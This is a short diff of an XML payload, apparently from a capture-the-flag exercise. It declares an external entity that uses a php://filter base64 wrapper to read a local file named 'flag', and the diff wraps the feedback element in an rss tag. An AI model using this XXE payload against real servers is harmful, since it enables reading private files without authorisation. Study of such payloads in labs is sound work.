@@ -1,4 +1,5 @@
 <?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0">
 <!DOCTYPE ANY [
 <!ENTITY remote SYSTEM "php://filter/read=convert.base64-encode/resource=./flag">
 ]>
@@ -7,3 +8,4 @@
   <email>2@ww.com</email>
   <content>undefined</content>
 </feedback>
+</rss>
